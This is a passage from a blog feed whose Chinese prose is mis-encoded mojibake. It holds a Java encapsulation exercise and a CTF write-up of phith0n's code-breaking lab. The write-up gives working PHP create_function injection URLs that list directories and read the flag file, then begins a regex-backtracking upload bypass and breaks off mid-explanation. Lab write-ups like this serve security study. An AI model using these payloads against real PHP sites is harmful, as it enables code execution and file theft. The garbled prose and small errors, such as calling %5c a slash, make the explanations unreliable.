class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹ç±»è¿›è¡Œå°è£…ï¼Œé˜²æ­¢å¤–ç•Œå¯¹ç±»ä¸­çš„æˆå‘˜å˜é‡éšæ„è®¿é—®ã€‚<br>ä¸ºäº†æŒæ¡ç±»çš„å°è£…ï¼Œæœ¬ç»ƒä¹ å°†ä½¿ç”¨privateå…³é”®å­—å¯¹å­¦ç”Ÿç±»çš„æˆå‘˜å˜é‡nameå’Œageè¿›è¡Œç§æœ‰åŒ–ï¼ŒåŒæ—¶åˆ†åˆ«æä¾›ä¸€ä¸ªsetName(String n)å’ŒsetAge(int a)æ–¹æ³•ç”¨äºå¤–ç•Œçš„è®¿é—®ï¼Œå…¶ä¸­setAge(int a)ä¸­éœ€è¦å¯¹ageè¿›è¡Œåˆ¤æ–­ã€‚</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">package task03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * è¯´æ˜ï¼šæ ¹æ®æç¤ºï¼Œè¡¥å……å®Œæ•´ begin å’Œ end ä¹‹é—´çš„ä»£ç ã€‚</span></span><br><span class="line"><span class="comment"> *     ï¼ˆå…¶ä»–ä»£ç å¯ä»¥ä¸ç”¨æ”¹ï¼‰</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"><span class="comment">// åœ¨æ­¤å®šä¹‰å­¦ç”Ÿç±»å</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">/**************** <span class="title">end</span> *****************/</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"> <span class="comment">// å°†åå­—nameå’Œå¹´é¾„ageå±æ€§å®šä¹‰ä¸ºç§æœ‰çš„</span></span><br><span class="line">private <span class="built_in">String</span> name;</span><br><span class="line">    private <span class="built_in">int</span> age;</span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* end *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * å®šä¹‰4ä¸ªå…¬æœ‰çš„æ–¹æ³•ï¼šgetName()ã€setName(String n)ã€</span></span><br><span class="line"><span class="comment"> * getAge()å’ŒsetAge(int a)ï¼Œ</span></span><br><span class="line"><span class="comment"> * ç”¨äºå¯¹å¤–è®¿é—®nameå’Œageã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * åœ¨setAge(int a)æ–¹æ³•ä¸­å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œæ£€æŸ¥ï¼Œ</span></span><br><span class="line"><span class="comment"> * å¦‚æœè¾“å…¥å€¼ä¸ºè´Ÿæ•°ï¼Œåˆ™æ‰“å°å‡ºâ€œè®¾ç½®çš„å¹´é¾„ä¸åˆæ³•â€ï¼Œ</span></span><br><span class="line"><span class="comment"> * å¦‚æœä¸ä¸ºè´Ÿæ•°ï¼Œæ‰å°†å…¶è®¾ç½®ä¸ºageå±æ€§çš„å€¼ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="built_in">String</span> getName()&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="built_in">int</span> getAge()&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">void</span> setAge(<span class="built_in">int</span> age)&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(age&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"è®¾ç½®çš„å¹´é¾„ä¸åˆæ³•"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.age = age;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">void</span> setName(<span class="built_in">String</span> name)&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* end *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> speak() &#123;</span><br><span class="line">System.out.println(<span class="string">"æˆ‘çš„åå­—æ˜¯"</span> + name + <span class="string">",ä»Šå¹´"</span> + age + <span class="string">"å²"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Task03</span></span>&#123;</span><br><span class="line">public <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="built_in">String</span>[] args) &#123;</span><br><span class="line">Scanner scan = <span class="keyword">new</span> Scanner(System.<span class="keyword">in</span>);</span><br><span class="line"><span class="built_in">String</span> name1 = scan.next();</span><br><span class="line"><span class="built_in">int</span> age1 = scan.nextInt();</span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * åˆ›å»ºStudentç±»çš„å®ä¾‹å¯¹è±¡ï¼Œ</span></span><br><span class="line"><span class="comment"> * é€šè¿‡è°ƒç”¨å¯¹è±¡çš„setName(String n)å’ŒsetAge(int a)æ–¹æ³•</span></span><br><span class="line"><span class="comment"> * æ¥è®¾ç½®å®ä¾‹å¯¹è±¡çš„nameå±æ€§å’Œageå±æ€§å€¼ï¼Œ</span></span><br><span class="line"><span class="comment"> * æ–¹æ³•çš„å‚æ•°å€¼ä¸ºè¿è¡Œæ—¶æ¥æ”¶ä»é”®ç›˜è¾“å…¥ï¼Œ</span></span><br><span class="line"><span class="comment"> * å¹¶è°ƒç”¨speak()æ–¹æ³•ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.setName(name1);</span><br><span class="line">        stu.setAge(age1);</span><br><span class="line">        stu.speak();</span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* end *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ç¬¬äºŒç« "><a href="#ç¬¬äºŒç« " class="headerlink" title="ç¬¬äºŒç« "></a>ç¬¬äºŒç« </h1><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> chapter2.step7;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;        <span class="comment">//1.å¯¼å…¥Scanner</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> HelloWorld&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args) &#123;</span><br><span class="line">        Scanner input = <span class="keyword">new</span> Scanner(System.in);    <span class="comment">//2.å£°æ˜æ‰«æä»ª</span></span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"è¯·å½•å…¥å«¦å¨¥ä¸ªäººä¿¡æ¯ï¼š"</span>);</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"è¯·è¾“å…¥å§“åï¼š"</span>);</span><br><span class="line">        String name = input.<span class="keyword">next</span>();</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"è¯·è¾“å…¥å¹´é¾„ï¼š"</span>);</span><br><span class="line">        <span class="keyword">int</span> age = input.nextInt();</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"è¯·è¾“å…¥æ€§åˆ«ï¼š"</span>);</span><br><span class="line">        String sex = input.<span class="keyword">next</span>();</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"è¯·è¾“å…¥ä½“é‡ï¼š"</span>);</span><br><span class="line">        <span class="keyword">float</span> weight = input.nextFloat();</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"è¯·è¾“å…¥åœ°å€ï¼š"</span>);</span><br><span class="line">        String address = input.<span class="keyword">next</span>();</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"è¯·è¾“å…¥æ˜¯å¦å·²å©šï¼š"</span>);</span><br><span class="line">        String isMarried = input.<span class="keyword">next</span>();</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"ä¿¡æ¯å¦‚ä¸‹ï¼š"</span>);</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"\tå§“åï¼š"</span> + name);</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"\tå¹´é¾„ï¼š"</span> + age + <span class="string">"å²"</span>);</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"\tæ€§åˆ«ï¼š"</span> + sex);</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"\tä½“é‡ï¼š"</span> + weight + <span class="string">"kg"</span>);</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"\tåœ°å€ï¼š"</span> + address);</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"\tå©šå¦ï¼š"</span> + isMarried);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>æ¹–æ¹˜æ¯web_WP</title>
      <link href="/2019/03/25/%E6%B9%96%E6%B9%98%E6%9D%AFweb-WP/"/>
      <url>/2019/03/25/%E6%B9%96%E6%B9%98%E6%9D%AFweb-WP/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer">]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>thinkphpæ­å»ºåšå®¢</title>
      <link href="/2019/03/24/thinkphp%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2019/03/24/thinkphp%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer">]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>pç¥ä»£ç å®¡è®¡çŸ¥è¯†æ˜ŸçƒäºŒå‘¨å¹´wp</title>
      <link href="/2019/03/24/p%E7%A5%9E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%BA%8C%E5%91%A8%E5%B9%B4wp/"/>
      <url>/2019/03/24/p%E7%A5%9E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%BA%8C%E5%91%A8%E5%B9%B4wp/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1pud0uqipj30jg054gm5.jpg" alt=""></p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>æ³¨: å¦‚æœæ˜¯åœ¨æœåŠ¡å™¨æ­å»ºç¯å¢ƒ è®°å¾—å¼€æ”¾æ‰€æœ‰ç«¯å£æˆ–è€…ç›¸åº”ç«¯å£<br>åœ¨ä¸€ä¸ªç›®å½•è¾“å…¥<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/phith0n/code-breaking.git</span><br></pre></td></tr></table></figure></p><p>ç„¶åè¿›å…¥ä¸€ä¸ªé¢˜ç›®ç›®å½•ï¼Œç„¶åè¾“å…¥<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker-compose up -d</span></span><br></pre></td></tr></table></figure></p><p>ç¯å¢ƒè¿è¡Œåï¼Œåœ¨docker-compose.ymlä¸­æŸ¥çœ‹ç«¯å£ï¼Œè®¿é—®å³å¯</p><h1 id="function"><a href="#function" class="headerlink" title="function"></a>function</h1><p>ç«¯å£8087<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1pu9e3j9sj30ng08smxf.jpg" alt=""><br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span><span class="comment">;</span></span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span></span><br></pre></td></tr></table></figure></p><p>åŒé—®å·ä¸ºä¸‰å…ƒè¿ç®—è¡¨è¾¾å¼<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">c</span> = a ?? b<span class="comment">;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">è¡¨ç¤ºå¦‚æœaéç©ºï¼Œåˆ™c = aï¼Œ</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">å¦‚æœaä¸ºç©ºï¼Œåˆ™ c = bï¼›</span></span><br></pre></td></tr></table></figure></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ç­‰ä»·äº</span><br><span class="line"></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ? $_GET[<span class="string">'action'</span>]: <span class="string">''</span><span class="comment">;</span></span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ? $_GET[<span class="string">'action'</span>]: <span class="string">''</span><span class="comment">;</span></span><br></pre></td></tr></table></figure><p>å³è¾“å…¥ä¸¤ä¸ªå‚æ•°ï¼Œè‹¥è¾“å…¥ï¼Œåˆ™å–æˆ‘ä»¬çš„è¾“å…¥ï¼Œå¦åˆ™ä¸ºç©º<br>ç„¶åæ˜¯å¯¹<code>$_GET[&#39;action&#39;]</code>çš„æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤<br>å› ä¸ºæ­£åˆ™é‡Œç”¨äº†^$ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰å¯èƒ½åœ¨å¼€å¤´æˆ–ç»“å°¾åŠ å…¥æŸä¸ªå­—ç¬¦æ¥ç»•è¿‡æ­£åˆ™<br>ä¸€æ—¦ç»•è¿‡æ­£åˆ™ï¼Œåˆ™å¯ä»¥è¿›è¡Œå±é™©å‡½æ•°æ„é€ <br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qfng2to2j30zf0hgn2b.jpg" alt=""><br>%5c æ˜¯ <code>/</code><br>ä»…å½“ä½¿ç”¨%5cæ‰“å¤´æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ­£å¸¸è¿è¡Œvar_dump()ï¼Œå¹¶ä¸”æˆåŠŸæ»¡è¶³æ­£åˆ™ã€‚<br>é‚£ä¹ˆè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\åœ¨phpä¸­è¡¨ç¤ºé»˜è®¤çš„å‘½åç©ºé—´,æ‰€æœ‰åŸç”Ÿå‡½æ•°å’Œç±»éƒ½åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸­</span><br><span class="line">æ™®é€šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°å<span class="function"><span class="keyword">function</span><span class="title">_name</span>(<span class="params"></span>)è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼›</span></span><br><span class="line"><span class="function">è€Œå¦‚æœå†™\<span class="function"><span class="keyword">function</span><span class="title">_name</span>(<span class="params"></span>) è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚</span></span></span><br><span class="line"><span class="function"><span class="function">å¦‚æœä½ åœ¨å…¶ä»–<span class="title">namespace</span>é‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•</span></span></span><br></pre></td></tr></table></figure></p><p>æ¥ä¸‹æ¥éœ€è¦æ‰¾ä¸€ä¸ªç¬¬äºŒä¸ªå‚æ•°å¯ä»¥å¼•å‘å±é™©çš„å‡½æ•°<br>string create_function ( string $args , string $code )<br>ç¬¬ä¸€ä¸ªå‚æ•°æ§åˆ¶å‡½æ•°çš„å˜é‡åï¼Œç¬¬äºŒä¸ªå‚æ•°æ§åˆ¶å‡½æ•°å†…çš„ä»£ç <br>ä¸¾ä¾‹:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">create_function</span><span class="params">(<span class="string">'$fname'</span>,<span class="string">'echo $fname."å¯ä¹"'</span>)</span></span></span><br></pre></td></tr></table></figure></p><p>ç­‰ä»·äº<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç±»ä¼¼äºï¼š</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span><span class="params">(<span class="keyword">$fn</span>ame)</span> &#123;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="keyword">$fn</span>ame.<span class="string">"å¯ä¹"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æ¥ä¸‹æ¥åˆ©ç”¨create_function() æ³¨å…¥<br>$arg = return â€œ2333â€;}phpinfo();/*<br>ç›¸å½“äº<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($a,$b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"2333"</span>;</span><br><span class="line">&#125;</span><br><span class="line">phpinfo();</span><br><span class="line"><span class="comment">/*&#125;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qg8qk7saj30xi0fkace.jpg" alt=""><br>è™½ç„¶create_function()å·²ç»ç§»é™¤äº† ä½†æ˜¯è¿˜æ˜¯ä¼šç»§ç»­æ‰§è¡Œä¸‹é¢çš„phpinfo()</p><p>æ¥ä¸‹é‡Œè¿›è¡Œè¯»å–ç›®å½•<br>å°†phpinfoæ›¿æ¢ä¸ºprint_r(scandir(â€˜../â€˜));å³å¯<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?action=%5ccreate_function&amp;arg=<span class="keyword">return</span>%20<span class="string">"2333"</span>;&#125;print_r(scandir(%27../%27));<span class="comment">/*</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qgczt7smj30yb0a9757.jpg" alt=""><br>æ¥ä¸‹æ¥è¯»å–æ–‡ä»¶å†…å®¹<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=%5ccreate_function&amp;arg=<span class="keyword">return</span>%20<span class="string">"2333"</span>;&#125;print_r(file_get_contents(%27../flag_h0w2execute_arb1trary_c0de%27));<span class="comment">/*</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qgetyvmjj30xw086jrq.jpg" alt=""><br>å¾—åˆ°flag</p><h1 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h1><p>ç«¯å£:8088<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span></span><br><span class="line"><span class="php">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (is_php($data)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    @mkdir($user_dir, <span class="number">0755</span>);</span></span><br><span class="line"><span class="php">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span></span><br><span class="line"><span class="php">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p><p>é€šè¿‡is_php()æ­£åˆ™æ¥æ£€æŸ¥$dataçš„å†…å®¹:å³:<br>&lt;åé¢ä¸èƒ½æœ‰é—®å·ï¼Œ&lt;?åé¢ä¸èƒ½æœ‰(;?&gt;åå¼•å·<br>é¢˜ç›®å¹¶æ²¡æœ‰ç¦æ­¢æˆ‘ä»¬ä¸Šä¼ phpæ–‡ä»¶ï¼Œä½†æ˜¯å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œç¦æ­¢æˆ‘ä»¬å†™å…¥phpä»£ç ã€‚æ¥ä¸‹æ¥å°±æ˜¯ç»•è¿‡æ­£åˆ™<br>åœ¨php7 ä¸­<br>tagséƒ½å·²ç»è¢«ç§»é™¤ æ‰€ä»¥æ— æ³•ä½¿ç”¨<br>&lt;%= phpinfo();<br>æˆ–è€…</p><p><script language="php">phpinfo();</script><br>æ¥ä¸‹æ¥è¦åˆ©ç”¨ <strong>phpæ­£åˆ™å›æº¯æ³•</strong><br><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><p>æ¶‰åŠåˆ°æ­£åˆ™åŒ¹é…çš„æµç¨‹ï¼Œæ­£åˆ™åŒ¹é…æœ‰ä¸¤ç§å¼•æ“<br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">DFA:</span> ä»èµ·å§‹çŠ¶æ€å¼€å§‹ï¼Œä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦åœ°è¯»å–è¾“å…¥ä¸²ï¼Œå¹¶æ ¹æ®æ­£åˆ™æ¥ä¸€æ­¥æ­¥ç¡®å®šè‡³ä¸‹ä¸€ä¸ªè½¬ç§»çŠ¶æ€ï¼Œç›´åˆ°åŒ¹é…ä¸ä¸Šæˆ–èµ°å®Œæ•´ä¸ªè¾“å…¥</span><br><span class="line">NFAï¼šä»èµ·å§‹çŠ¶æ€å¼€å§‹ï¼Œä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦åœ°è¯»å–è¾“å…¥ä¸²ï¼Œå¹¶ä¸æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœåŒ¹é…ä¸ä¸Šï¼Œåˆ™è¿›è¡Œå›æº¯ï¼Œå°è¯•å…¶ä»–çŠ¶æ€</span><br></pre></td></tr></table></figure></p><p>phpçš„PCREåº“ä½¿ç”¨çš„å°±æ˜¯NFAçš„æ­£åˆ™å¼•æ“ï¼Œå°±ä¼šæ¶‰åŠåˆ°å›æº¯çš„ä¸€ä¸ªè¿‡ç¨‹ã€‚<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qh5fwi9ij318q0g7762.jpg" alt=""><br>ä¸€å¼€å§‹ 